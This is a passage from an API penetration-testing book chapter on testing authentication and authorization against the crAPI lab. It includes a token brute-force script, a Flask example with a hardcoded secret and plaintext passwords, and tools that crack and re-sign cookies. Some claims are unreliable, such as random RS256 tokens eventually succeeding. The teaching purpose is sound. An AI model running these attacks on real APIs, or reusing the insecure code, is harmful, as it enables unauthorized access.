<html><head></head><body>
		<div><h1 id="_idParaDest-54" class="chapter-number"><a id="_idTextAnchor056"/>4</h1>
			<h1 id="_idParaDest-55"><a id="_idTextAnchor057"/>Authentication and Authorization Testing</h1>
			<p>Assuming you read the previous chapter or already have knowledge about <strong class="bold">Application Programming Interface</strong> (<strong class="bold">API</strong>) reconnaissance, it’s now time to dive deeper into pentesting <a id="_idIndexMarker249"/>the API. In the previous chapter, we worked through a crAPI challenge by accessing data from objects that belong to other users. This data was supposed to be protected, but crAPI didn’t do it correctly. This was an authorization flaw.</p>
			<p>We need to investigate how APIs establish some of their most fundamental security mechanisms, which are <a id="_idIndexMarker250"/>how they authenticate and authorize their users. We will use the term <strong class="bold">AuthN</strong> to refer to <strong class="bold">authentication</strong> and <strong class="bold">AuthZ</strong> to refer to <strong class="bold">authorization</strong> just to <a id="_idIndexMarker251"/>shorten the words; this is a common practice in the literature. Weak AuthN mechanisms can usually be discovered during the initial stage of our work, which we covered in the previous chapter. After some interactions and analysis, we can discover the data structures an API applies and then spot weak AuthZ controls.</p>
			<p>In this chapter, you will learn about both topics in more depth, not only analyzing how they are presented by APIs but also understanding best practices for configuring and implementing them to protect the app environment. Weak or poorly implemented AuthN and/or AuthZ guardrails can compromise the whole application, not just the API.</p>
			<p>In this chapter, we’re going to cover the following main topics:</p>
			<ul>
				<li>Examining authentication mechanisms</li>
				<li>Testing for weak credentials and default accounts</li>
				<li>Exploring authorization mechanisms</li>
				<li>Bypassing access controls</li>
			</ul>
			<h1 id="_idParaDest-56"><a id="_idTextAnchor058"/>Technical requirements</h1>
			<p>We’ll leverage the same environment as the one described in <a href="B19657_03.xhtml#_idTextAnchor042"><em class="italic">Chapter 3</em></a>. In summary, you’ll need a type 2 hypervisor, such as VirtualBox, and the same tools we used before, especially the crAPI project.</p>
			<h1 id="_idParaDest-57"><a id="_idTextAnchor059"/>Examining authentication mechanisms</h1>
			<p>There are various APIs on the internet that work without a need for previous AuthN, mainly <a id="_idIndexMarker252"/>for read-only operations. A good example <a id="_idIndexMarker253"/>of such a use case is the <strong class="bold">Comprehensive Knowledge Archive Network</strong> (<strong class="bold">CKAN</strong>) framework (<a href="https://ckan.org/">https://ckan.org/</a>). It’s an open source project that makes it easier for companies and governments to publish data on the internet. Entirely written in Python, the framework has a RESTful API with both read and write operations. Since CKAN was designed to help <em class="italic">open data</em> initiatives, having read access to data served by portals supported by it is expected.</p>
			<p>There is <a id="_idIndexMarker254"/>also a fair amount of API endpoints that work without AuthN. In the previous chapter, we mentioned the OSINT Framework, a website that curates a list of other <strong class="bold">Open Source Intelligence</strong> (<strong class="bold">OSINT</strong>) websites, tools, and blogs. You will find a couple of utilities, such as IP location and geo-location, that work on the internet completely for free and without previous AuthN. In such cases, only read operations are allowed and the services’ owners should protect their backends against inadvertent attempts to access protected data.</p>
			<p>Sooner or later, an API might need an AuthN mechanism. We will explain the different AuthN mechanisms one by one. Currently, the following ones are the most common when implementing APIs, especially RESTful APIs:</p>
			<ul>
				<li><strong class="bold">API keys</strong>: Unique <a id="_idIndexMarker255"/>identifiers issued to applications for AuthN. Public cloud providers may give you one or two such keys to allow you to identify yourself (or some code) while interacting with the provider via their APIs.</li>
				<li><strong class="bold">Basic AuthN</strong>: Transmits <a id="_idIndexMarker256"/>the username and password in Base64 encoding (not recommended for sensitive data). Many people still confuse encoding with encryption. It doesn’t matter if the text looks like complete nonsense; there’s no security in simply encoding data. Even <a id="_idIndexMarker257"/>when basic AuthN happens using an encrypted channel, as a TLS connection, this should be avoided at all costs.</li>
				<li><strong class="bold">OAuth</strong>: Open <a id="_idIndexMarker258"/>standard for AuthZ, delegating access without sharing credentials. Also called a bearer token, OAuth 2.0 provides a token-based AuthN mechanism. The client obtains a token from an AuthZ <a id="_idIndexMarker259"/>server and includes it in API requests. <strong class="bold">OpenID Connect</strong> (<strong class="bold">OIDC</strong>) is an AuthN layer built on top of OAuth. OIDC enhances OAuth by adding an identity layer, allowing clients to verify the identity of the end user.</li>
				<li><strong class="bold">Session tokens</strong>: Used <a id="_idIndexMarker260"/>to maintain an authenticated state after initial login. They are like temporary keys generated after you log in, stored in your browser or website code. They identify you to online platforms without constant logins and offer convenience and security benefits.</li>
				<li><strong class="bold">JSON Web Tokens (JWTs)</strong>: Self-contained tokens carrying user information and <a id="_idIndexMarker261"/>claims. This is a compact, URL-safe means of representing claims between two parties. They are often used as bearer tokens in AuthN. JWTs are often passed in headers or as query parameters.</li>
			</ul>
			<p>Let’s delve deeper into each of these methods.</p>
			<h2 id="_idParaDest-58"><a id="_idTextAnchor060"/>API keys</h2>
			<p>API keys are <a id="_idIndexMarker262"/>a form of AuthN used to control access to <a id="_idIndexMarker263"/>APIs. They are strings of characters, usually generated by the API provider, and act as a token to authenticate and authorize requests made by a client (an application, user, or another service) to the API server. They are unique strings of characters that act as digital identifiers, granting applications access to APIs. They serve as a basic AuthN mechanism, ensuring only authorized users can access sensitive data or functionality. As mentioned before, this is one of the ways public cloud providers choose to establish AuthN in their platforms, usually implemented when customers are writing applications to interact with their APIs or when using their CLI tools.</p>
			<p>API keys can be generated as single keys or pairs of keys (more common). When presented as pairs, one of the keys represents the login/username whereas the other works like a password. The keys are internally associated with an actual username. You may ask yourself, what’s the reason for having another pair of credentials if the well-known username/password method would sort out the AuthN part? It’s simple: while a username can only have a single active password, the same username can have multiple attached API <a id="_idIndexMarker264"/>keys that could in turn have different permissions bound to them (AuthZ). Another difference has to do with the essence of the concept. API keys allow <em class="italic">applications</em> to interact with APIs, and username/password credential pairs are meant to be used by <em class="italic">people</em>.</p>
			<p>To work, API keys <a id="_idIndexMarker265"/>need to be provided in all requests. There are various strategies to handle such keys. Some utilities store them in clear-text configuration files and load them to memory, whereas others simply create environment variables to store the contents. Storage of the keys is exactly the preferred way to discover them. Now and then, developers leak them to public repositories or even hardcode them in HTML or JavaScript files. You can leverage some tools to help you with this step, such as the following:</p>
			<ul>
				<li><strong class="bold">badsecrets</strong> (<a href="https://github.com/blacklanternsecurity/badsecrets">https://github.com/blacklanternsecurity/badsecrets</a>): Library to look <a id="_idIndexMarker266"/>for secrets in many different platforms.</li>
				<li><strong class="bold">Gitleaks</strong> (<a href="https://gitleaks.io/">https://gitleaks.io/</a>): Maybe <a id="_idIndexMarker267"/>the most popular tool to find keys in Git-like repositories, directories, and files.</li>
				<li><strong class="bold">KeyFinder</strong> (<a href="https://github.com/momenbasel/KeyFinder">https://github.com/momenbasel/KeyFinder</a>): Chrome extension to find <a id="_idIndexMarker268"/>keys while browsing the web.</li>
				<li><strong class="bold">Keyhacks</strong> (<a href="https://github.com/streaak/keyhacks">https://github.com/streaak/keyhacks</a>): Public repository with keys <a id="_idIndexMarker269"/>discovered in various bug bounty programs. Helps you check whether they are valid after the programs have ended. This tool has a ChatGPT Plus version: https://chat.openai.com/g/g-JaNIbfsRt-keyhacks-gpt.</li>
				<li><strong class="bold">Mantra</strong> (<a href="https://github.com/MrEmpy/mantra">https://github.com/MrEmpy/mantra</a>): Search <a id="_idIndexMarker270"/>for keys in HTML and JavaScript files.</li>
				<li><strong class="bold">Nuclei Templates</strong> (<a href="https://github.com/projectdiscovery/nuclei-templates">https://github.com/projectdiscovery/nuclei-templates</a>): You <a id="_idIndexMarker271"/>can use this to test the same keys against various API endpoints.</li>
				<li><strong class="bold">Secrets Patterns DB</strong> (<a href="https://github.com/mazen160/secrets-patterns-db">https://github.com/mazen160/secrets-patterns-db</a>): A regular <a id="_idIndexMarker272"/>expressions database that can be used by other tools, such as TruffleHog, to look for key, token, or password patterns in various types of files.</li>
				<li><strong class="bold">TruffleHog</strong> (<a href="https://github.com/trufflesecurity/truffleHog">https://github.com/trufflesecurity/truffleHog</a>): A Swiss army knife that <a id="_idIndexMarker273"/>looks for secrets and keys in many places, including GitHub repos, and container images.</li>
			</ul>
			<p>Some of these tools run as containers, some are libraries you can leverage to empower your own code, and some are command-line utilities. You won’t have trouble finding other similar tools, including for pentesting distros such as Kali Linux. Let’s make a quick test with <a id="_idIndexMarker274"/>TruffleHog against some of my personal GitHub <a id="_idIndexMarker275"/>repositories. First, we’ll use the tool alone and then we’ll add Secrets Patterns DB. To leverage Secrets Patterns DB, we first need to use it to create a regex JSON patterns file. Let’s run the tool first:</p>
			<pre class="console">
$ docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/mauricioharley/barbican-operator --issue-comments --pr-comments
TruffleHog. Unearth your secrets.
2024-01-03T12:22:34Z	info-0	trufflehog	running source	{"source_manager_worker_id": "WH1SL", "with_units": false, "target_count": 0, "source_manager_units_configurable": true}
2024-01-03T12:22:34Z	info-0	trufflehog	Completed enumeration	{"num_repos": 1, "num_orgs": 0, "num_members": 0}
2024-01-03T12:22:36Z	info-0	trufflehog	finished scanning	{"chunks": 1056, "bytes": 861040, "verified_secrets": 0, "unverified_secrets": 0, "scan_duration": "2.502645278s"}</pre>			<p>Now, let’s leverage Secrets Pattern DB and run it again:</p>
			<pre class="console">
$ ./convert-rules.py --db ../db/rules-stable.yml --type trufflehog &gt; /tmp/regex.json
$ ./trufflehog github --repo https://github.com/mauricioharley/barbican-operator --include-paths=/tmp/regex.json --issue-comments --pr-comments
TruffleHog. Unearth your secrets.
2024-01-03T14:38:49+01:00	info-0	trufflehog	running source	{"source_manager_worker_id": "v1HMM", "with_units": false, "target_count": 0, "source_manager_units_configurable": true}
2024-01-03T14:38:49+01:00	info-0	trufflehog	Completed enumeration	{"num_repos": 1, "num_orgs": 0, "num_members": 0}
2024-01-03T14:38:52+01:00	info-0	trufflehog	finished scanning	{"chunks": 0, "bytes": 0, "verified_secrets": 0, "unverified_secrets": 0, "scan_duration": "2.861085032s"}</pre>			<p>Thankfully, no secret <a id="_idIndexMarker276"/>has been found so far. As a side <a id="_idIndexMarker277"/>note, after generating the <code>regex.json</code> file you see in the preceding output, I had issues with a couple of the populated regular expressions. Maybe it had to do with some missing update on Secrets Patterns DB, since it mentions TruffleHog version 2 but this tool is already on version 3.</p>
			<h2 id="_idParaDest-59"><a id="_idTextAnchor061"/>Basic authentication</h2>
			<p>This is <a id="_idIndexMarker278"/>possibly one of the easiest AuthN <a id="_idIndexMarker279"/>methods to detect when in place. Every time you try to access a website and the browser shows you a dialog box asking you for a credential pair, that’s basic AuthN. When a web client accesses a server that requires basic AuthN, all requests are provided with an <code>Authorization</code> header that is filled with the username and the password separated by a colon, all encoded in Base64.</p>
			<p>An example request would be something like this:</p>
			<pre class="source-code">
GET /api/v2/list_resources
Authorization: Basic bWF1cmljaW86TXlQYXNzd29yZCNAIQo=</pre>			<p>When the server receives it, a simple Base64-decoding operation takes place to check whether the credentials are valid. When the AuthN passes, the server responds with the request; otherwise, it sends a 401 code for an unauthorized operation. Here, there are other factors that should be considered: how securely is such a user database stored and handled? Are the credentials even encrypted at rest? Is there some kind of hashing or salting mechanism to generate or double-check the validity of the passwords?</p>
			<p>And how <a id="_idIndexMarker280"/>can you realize when this type of AuthN is being used? Simple. The <a id="_idIndexMarker281"/>first method is through analyzing the requests. The presence of the <code>Authorization</code> keyword makes this clear. The responses can also denote its presence. Depending on how the server was implemented, you may receive the <code>WWW-Authenticate</code> header. Finally, if the connection is not protected via TLS, any network inspection tool, such as Wireshark, will disclose the AuthN type. Some very old web servers can even include the username and password as part of the query string itself.</p>
			<p>Some ways <a id="_idIndexMarker282"/>to attack basic AuthN environments are through <strong class="bold">Man-in-the-Middle</strong> (<strong class="bold">MiTM</strong>) attacks when no TLS is applied or via brute force, by trying to systematically guess the credential pair, or even by applying some social engineering such as phishing. In fact, basic AuthN is so unsecure and old that you may not find many API endpoints out there running it. Nevertheless, in some searches I carried out while writing this chapter, I found some documentation explaining how to configure products such as WSO2 (<a href="https://apim.docs.wso2.com/en/3.0.0/learn/design-api/endpoints/endpoint-security/basic-auth/">https://apim.docs.wso2.com/en/3.0.0/learn/design-api/endpoints/endpoint-security/basic-auth/</a>) and Apigee’s Edge API (<a href="https://docs.apigee.com/api-platform/system-administration/basic-auth">https://docs.apigee.com/api-platform/system-administration/basic-auth</a>). Daunting…</p>
			<h2 id="_idParaDest-60"><a id="_idTextAnchor062"/>OAuth</h2>
			<p>This is <a id="_idIndexMarker283"/>possibly one of the most used AuthN mechanisms on the web nowadays. OAuth is <a id="_idIndexMarker284"/>key to enable you, for example, to log in to your preferred game platform without having to create a credential pair by simply leveraging some existing external credential, such as the one you use to access your Google, Facebook, or Apple accounts, for example.</p>
			<p>OAuth has two versions released so far. Version 1.0 was published in 2010 and introduced the core concepts of token-based AuthN. It relies on the use of cryptographic signatures to secure communications. OAuth 2.0 was published in 2012 and is the most recent version since then. It is a significant evolution from OAuth 1.0, introducing a more <a id="_idIndexMarker285"/>simplified and flexible AuthZ framework. It <a id="_idIndexMarker286"/>relies on tokens, including access tokens and refresh tokens, to grant access and manage permissions.</p>
			<p>Some <a id="_idIndexMarker287"/>key components need to be mentioned:</p>
			<ul>
				<li><strong class="bold">Resource owner</strong>: The entity that owns the resource, typically the end user.</li>
				<li><strong class="bold">Client</strong>: The application or service that wants to access the user’s resources.</li>
				<li><strong class="bold">Authorization server</strong>: Manages the authorization process and issues access tokens after successful AuthN.</li>
				<li><strong class="bold">Resource server</strong>: Hosts the protected resources (e.g., user photos) that the client wants to access.</li>
				<li><strong class="bold">Access token</strong>: A credential representing the resource owner’s AuthZ.</li>
				<li><strong class="bold">Refresh token</strong>: A credential used to obtain a new access token when the current one expires.</li>
			</ul>
			<p>There are a couple of ways we can detect when OAuth is being used by an API endpoint. The documentation is the first place to go and will save you time. Additionally, the presence of <code>Authorization: Bearer &lt;token&gt;</code> or <code>Authorization: Bearer &lt;token type&gt; &lt;token&gt;</code> will also reveal the AuthN type. Finally, you can adopt the generic <em class="italic">trial-and-error</em> method to send some dummy requests with invalid tokens and capture the outputs. The crAPI project does not make use of this. Instead, it applies something very similar that we will cover in the next section.</p>
			<p>One of the <a id="_idIndexMarker288"/>purposes of applying OAuth to a web application is to allow the user to leverage <strong class="bold">Single Sign-On</strong> (<strong class="bold">SSO</strong>). So, by having a single place to store the user’s credentials, there’s a single point that needs to be cared about encryption at rest at least for the users’ database. Then, by making use of a secure way to communicate the credentials, the same person can seamlessly log in to several different applications without needing to provide their credential pair every time.</p>
			<p>In the OAuth architecture, the <strong class="bold">Identity Provider</strong> (<strong class="bold">IdP</strong>) is the element responsible for storing and <a id="_idIndexMarker289"/>managing the credential pair. The OAuth 2.0 specification has a couple of different flows to provide a grant (a way to release an access token to the requesting application). When working on the application’s integration with the IdP, the developer needs to choose between the different flows:</p>
			<ul>
				<li><strong class="bold">Authorization Code Grant (ACG) flow</strong>: This is commonly the best option since <a id="_idIndexMarker290"/>it includes a double-checking step. It requires a backend server and does some HTTP 302 redirection to a redirection endpoint where some code is provided. The app developer needs to confirm that the IdP’s provided endpoint is the same as the one that was used by the user.</li>
				<li><strong class="bold">Implicit Grant Flow (IGF)</strong>: Also known as client-side-only flow, this is the second <a id="_idIndexMarker291"/>most common option. In this case, there is no backend server. The app communicates directly with the IdP. User credentials are provided to get an OAuth access token. There is no client ID because it can be easily spoofed.</li>
				<li><strong class="bold">Client Credentials Grant (CCG) flow</strong>: This is a niche use case and is rarely used. CCG <a id="_idIndexMarker292"/>can be used when the client application has resources with a service provider that are owned and consumed by the client application itself, and not by the end user. With CCG, the client app requests an access token on its own behalf, and then subsequently uses that access token to access protected resources it needs.</li>
				<li><strong class="bold">Password Grant flow</strong>: This should not be used whatsoever. It’s very simple since it <a id="_idIndexMarker293"/>only requires that the demanding service informs the username and password through a regular POST request. This method is not allowed according to the OAuth 2.0 Security Best Practices (link in the <em class="italic">Further </em><em class="italic">reading</em> section).</li>
			</ul>
			<p>There are <a id="_idIndexMarker294"/>some OAuth misconfigurations that could lead us <a id="_idIndexMarker295"/>to be successful in an attack against applications leveraging such a mechanism. The client ID and client secret should never be made available to end users. They should be protected just like a credential because they could allow a malicious customer to make calls to the IdP on behalf of a legitimate app and therefore impersonate the legitimate app. For OAuth 2.0, this by itself doesn’t allow for user impersonation because the attacker would still need access to user credentials. However, a malicious user could build a cloned application that gathers the credentials of users. This attack could be even easier by forming clickable links and putting them into a forum or email (with those links going back to an attacker’s backend server that has been configured with a stolen client ID/client secret).</p>
			<p>One common <a id="_idIndexMarker296"/>attack against an OAuth-powered API is brute force. crAPI does not <a id="_idIndexMarker297"/>leverage such a mechanism, but let’s see what we can get with some simple Python code interacting with the vehicles’ parts website. The code was adapted from Tescum (<a href="https://github.com/akimbo7/Tescum">https://github.com/akimbo7/Tescum</a>) and is as follows:</p>
			<pre class="source-code">
import random, requests, string, time
token_start = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ"
symbols = string.ascii_letters + string.digits + "_.-"
tries = 1000 # Choose a number at your convenience
wait_time = 50 # Number of ms to wait for before sending the next request
for _ in range(tries):
    key = token_start + ''.join(random.choice(symbols) for i in range(464-len(token_start))) # crAPI tokens have 464 bytes.
    headers = {'Authorization': f'Bearer {key}'}
    r = requests.get(
            'http://localhost:8888/workshop/api/shop/products',
            headers = headers)
    if 'Invalid JWT Token!' in r.text:
        print(f"Token FAILED {key}")
        print(f"Code: {r.status_code} Message: {r.json()['message']}\n")
    else:
        print(f"Token OK! {key}")
    time.sleep(round(wait_time / 1000))</pre>			<p>Now some explanations. This code would better run with threads as the original, but it only worked <a id="_idIndexMarker298"/>once on my test system! This aside, the previous <a id="_idIndexMarker299"/>version works well, and I added a time sleeping line to avoid overloading crAPI’s endpoint. During some login activities, I realized all bearer tokens started with <code>eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ</code>. Hence, this was assigned to a variable. This represents, in part, <code>{"alg":"RS256"}</code> after decoding from Base64. The rest of the token is a random sequence of letters, digits, and the symbols <code>-</code>, <code>.</code>, and <code>_</code>. Some of the iterations generate less probable valid tokens, such as the ones ending with a sequence of two underscores, whereas others are more similar. You can run this thousands of times without success but eventually, it will succeed. It’s a simple suggestion for a brute-force script.</p>
			<p>Some applications have simpler token life cycle management, storing them on a local database and never rotating or expiring them. While convenient, since it makes the code smaller and easier to maintain, it has inherent security problems. Depending on how protected the storage location is, this database could be leaked or exfiltrated because of an attack, and then all the application’s users’ credentials would be available. Not frequently rotating tokens is also a bad habit because some users may choose to locally store them in unsafe ways, which would make them available to a handful of client-side attacks, including phishing variations.</p>
			<p>OAuth is not exactly failproof. In late 2023, a failure in Google’s OAuth implementation was disclosed to the public many days after the company was notified and supposedly, they did not take any further action to fix it. The problem lies in how Google handles email addresses on its accounts, allowing different mailboxes with the same domain name to submit the same claim. The explanation is available here: <a href="https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/">https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/</a>.</p>
			<h2 id="_idParaDest-61"><a id="_idTextAnchor063"/>Session tokens</h2>
			<p>Session tokens have been a fundamental component of web security, evolving in tandem with the growth of web applications. Their history can be traced to the need to maintain user <a id="_idIndexMarker300"/>states securely across multiple interactions with a web server. A session token is a unique identifier assigned to a user <a id="_idIndexMarker301"/>upon successful AuthN. It serves as a reference to the user’s session data stored on the server. Typically, a session token is generated after the user logs in, and it is sent back to the client, often as a cookie. Subsequent requests from the client include this token, allowing the server to identify the user and retrieve their session data. This mechanism helps maintain stateful interactions in stateless HTTP, enhancing user experience and security.</p>
			<p>In a typical scenario, after a user logs in to a web application, a session token is generated, securely stored on the server, and sent to the client. This token is then included in subsequent requests, enabling the server to associate requests with a specific user’s session and deliver personalized content or maintain user-specific settings. Detecting the use of session tokens involves inspecting the communication between the client and the server. They are commonly found in HTTP cookies, identifiable by names such as <code>session_id</code> or <code>access_token</code>. Additionally, examining the headers of HTTP requests may reveal the presence of session tokens. Let’s observe how such tokens could be generated with a sample Flask application:</p>
			<pre class="source-code">
from flask import Flask, request, session, jsonify
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
# Dummy user data for authentication
users = {
    'user1': {'password': 'pass123', 'role': 'user'},
    'admin': {'password': 'adminpass', 'role': 'admin'}
}
@app.route('/')
def home():
    if 'username' in session:
        return f'Hello, {session["username"]}! Your role is {session["role"]}.'
    return 'Welcome to the home page. Please login.'
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    if username in users and users[username]['password'] == password:
        session['username'] = username
        session['role'] = users[username]['role']
        resp = jsonify({'message': 'Login successful!'})
        resp.set_cookie('session_token', session['username'])
        return resp
    else:
        return 'Login failed. Check your username and password.'
@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('role', None)
    resp = jsonify({'message': 'Logout successful!'})
    resp.delete_cookie('session_token')
    return resp
if __name__ == '__main__':
    app.run(debug=True)</pre>			<p>You can interact <a id="_idIndexMarker302"/>with this application via Postman or, more simply, with a couple of <code>curl</code> commands. The app is waiting for a POST request as the login and <a id="_idIndexMarker303"/>subsequent GET requests. The login body must be provided in JSON format, so we need to instruct <code>curl</code> accordingly. Also, to guarantee the session cookie is correctly stored locally, we use the <code>--</code><code>cookie-jar</code> option:</p>
			<pre class="console">
$ curl http://localhost:5000
Welcome to the home page. Please login.
$ curl -X POST -H "Content-Type: application/json" -d '{"username": "user1", "password": "pass123"}' http://localhost:5000/login --cookie-jar cookie.txt
{
  "message": "Login successful!"
}
$ curl -b cookie.txt -c cookie.txt http://localhost:5000/
Hello, user1! Your role is user.
$ curl -b cookie.txt -c cookie.txt http://localhost:5000/logout
{
  "message": "Logout successful!"
}</pre>			<p>The <code>cookie.txt</code> file will have contents like these (font size reduced to facilitate comprehension):</p>
			<pre class="source-code">
#HttpOnly_localhost	FALSE	/	FALSE	0	session eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c
localhost	FALSE	/	FALSE	0	session_token	user1</pre>			<p>Session tokens are vulnerable to attacks if not handled securely. Common attacks include <strong class="bold">session hijacking</strong>, where an attacker steals a user’s session token and impersonates them. <strong class="bold">Session fixation</strong> is another threat, involving an attacker forcing a user to use <a id="_idIndexMarker304"/>a specific session token. You can <a id="_idIndexMarker305"/>easily discover whether some API endpoint is using this mechanism by using the developer mode of your preferred web browser. crAPI, for example, does not use it.</p>
			<p>In this implementation we provided, the cookie was signed with the key present in the very beginning of the application’s source code. There is a very handy tool written in Golang called CookieMonster (<a href="https://github.com/iangcarroll/cookiemonster">https://github.com/iangcarroll/cookiemonster</a>) that you can leverage to discover this key. It makes use of a default wordlist but also supports your own list, which grants it an interesting power. Let’s test it with the cookie that was generated by our sample app:</p>
			<pre class="console">
$ ./cookiemonster -cookie "eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c"
   CookieMonster 1.4.0
  CookieMonster loaded the default wordlist; it has 38919 entries.
 Success! I discovered the key for this cookie with the flask decoder; it is "secret_key".</pre>			<p>And <em class="italic">voilà</em>! The tool also has a convenient feature to resign cookies, which you can use to circumvent the API’s AuthZ mechanism by creating your own cookie with the corresponding token without having to authenticate first. However, it currently only works for Django apps:</p>
			<pre class="console">
$ ./cookiemonster -cookie "eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c" 
-resign "My Own Data"
  CookieMonster 1.4.0
  CookieMonster loaded the default wordlist; it has 38919 entries.
 Success! I discovered the key for this cookie with the flask decoder; it is "secret_key".
 I resigned this cookie for you; the new one is: TXkgT3duIERhdGE.Za2WiQ.UJu6-KPF2cdDy2bFz6bk3vi-OhY</pre>			<h2 id="_idParaDest-62"><a id="_idTextAnchor064"/>JSON Web Tokens (JWTs)</h2>
			<p>JWTs are one of the most modern ways to authenticate and authorize applications and users on <a id="_idIndexMarker306"/>the web. They emerged at the beginning of the 2010s and were developed as a proposal to the increasing number of applications showing <a id="_idIndexMarker307"/>up in the mobile arena. This universe has an inherent demand for secure AuthN and AuthZ mechanisms. JWTs are different from the previous methods we talked about since they decouple the user identity from server sessions. They offer a more secure way to carry the necessary data to different systems and applications.</p>
			<p>Every JWT has three parts:</p>
			<ul>
				<li><strong class="bold">Header</strong>: Contains <a id="_idIndexMarker308"/>metadata about the token, including its format and signing algorithm.</li>
				<li><strong class="bold">Payload</strong>: Holds the <a id="_idIndexMarker309"/>actual claims about the user, such as username, roles, and permissions. This data is typically encoded in JSON format.</li>
				<li><strong class="bold">Signature</strong>: A unique <a id="_idIndexMarker310"/>cryptographic fingerprint generated using a secret key, ensuring the token’s integrity and authenticity.</li>
			</ul>
			<p>When you log in to a JWT-enabled system, the server generates a JWT containing your claims and signs it with a secret key. This token is then sent to your browser and securely stored. With every subsequent request, the browser automatically sends the token to the server. The server verifies the signature and decodes the payload, granting access based on the user’s claims. To detect the use of JWTs in an API endpoint, inspect the headers of incoming requests. JWTs are commonly transmitted in the <code>Authorization</code> header using the <code>Bearer</code> scheme, such as <code>Authorization: Bearer &lt;token&gt;</code>. This is the case with crAPI. Additionally, APIs might include information in their documentation or response headers indicating the use of JWTs for AuthN.</p>
			<p>There are two tools that you should consider when dealing with JWTs. The first one is <a href="https://jwt.io/">https://jwt.io/</a>. The header, payload, and signature are highlighted in different colors to facilitate <a id="_idIndexMarker311"/>comprehension. Using Postman, <code>curl</code>, or the developer <a id="_idIndexMarker312"/>tools of your web browser, log in to crAPI and obtain the token that is generated as a response to a successful AuthN attempt (<em class="italic">Figure 4</em><em class="italic">.1</em>). Store it somewhere.</p>
			<div><div><img src="img/B19657_04_01.jpg" alt="Figure 4.1 – crAPI token generated after a successful login"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.1 – crAPI token generated after a successful login</p>
			<p>Copy the token into the <strong class="bold">Encoded</strong> section of the JWT.io website. This will reveal all the details about the token, including which algorithm was used to generate it. Now, download the <a id="_idIndexMarker313"/>second tool, JWT Toolkit v2, available at <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a>. This is a Python script that can carry out several different tasks related to JWTs. Let’s see what it says about our recently copied token (part of the command was omitted for brevity):</p>
			<pre class="console">
$ python jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdW...
Token header values:
[+] alg = "RS256"
Token payload values:
[+] sub = "mauricio@domain.com"
[+] role = "user"
[+] iat = 1706051672    ==&gt; TIMESTAMP = 2024-01-24 00:14:32 (UTC)
[+] exp = 1706656472    ==&gt; TIMESTAMP = 2024-01-31 00:14:32 (UTC)
Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 7 days, 0 hours, 0 mins</pre>			<p>We can see the token was signed with RS256 and that there are four values in its payload: the <code>sub</code> (usually, the username), a role, and two timestamps, when the token was issued and its expiration date. JWTs may be signed using several algorithms, but it’s commonly <a id="_idIndexMarker314"/>more seen in one of these fashions: either with HS or without HS. The ones starting with HS are the most <a id="_idIndexMarker315"/>vulnerable simply because they are symmetric signing methods. They use <strong class="bold">Hash-Based Message Authentication Code</strong> (<strong class="bold">HMAC</strong>) combined with a <strong class="bold">Secure Hash Algorithm</strong> (<strong class="bold">SHA</strong>) hash. Because <a id="_idIndexMarker316"/>they are symmetric methods, it becomes more difficult to protect and share the signing key in scenarios when lots of peers are talking to each other. And, of course, once the key is compromised, a token can be forged and the AuthN/AuthZ system would not realize the difference from a legitimate token.</p>
			<p>On the other <a id="_idIndexMarker317"/>hand, RS-like JWTs use the <strong class="bold">Rivest-Shamir-Adleman</strong> (<strong class="bold">RSA</strong>) asymmetric algorithm, where the server signs the token with the private key and publishes the corresponding public key to allow the token verification by third parties. The system is as secure as the mechanisms applied to protect the private key. Obviously, these tokens are more secure, but their generation and verification might be slower since an asymmetric algorithm is in place.</p>
			<p>However, even systems with RS implementations might be vulnerable to JWT attacks. There are a couple of ways to test whether there is some flaw. Making use of our friend <code>jwt_tool</code>, let’s run it against our crAPI deployment just to see whether it can find some vulnerability. After recording the AuthZ token you received when logging in, type the following (single line). <code>/workshop/api/shop/products</code> is a crAPI endpoint:</p>
			<pre class="console">
$ python jwt_tool.py -M at -t "http://localhost:8888/workshop/api/shop/products" -rh "Authorization: Bearer &lt;original token&gt;"
...
[+] Sending token
jwttool_7eaff80aee0ab3e8792d5bc1292a927b Sending token Response Code: 200, 169 bytes
Running Scanning Module:
Running prescan checks...
...
Scanning mode completed: review the above results.</pre>			<p>No vulnerabilities <a id="_idIndexMarker318"/>were found. The tool <a id="_idIndexMarker319"/>was not successful while attacking the original token. It suggests using <code>hashcat</code> to try some brute-force attack. You may try it, but you’ll find out that hashcat complains about the token size, saying it’s too big.</p>
			<p>APIs that implement JWTs may have an endpoint available at <code>/.well-known/jwks.json</code> or <code>/jwks.json</code>. The sole purpose of such endpoints is to publicize the <a id="_idIndexMarker320"/>public keys used to sign the tokens generated by the API. <code>http://localhost:8888/.well-known/jwks.json</code>) and copy its contents. It is a JSON structure with a series of keys and values, something like this:</p>
			<pre class="source-code">
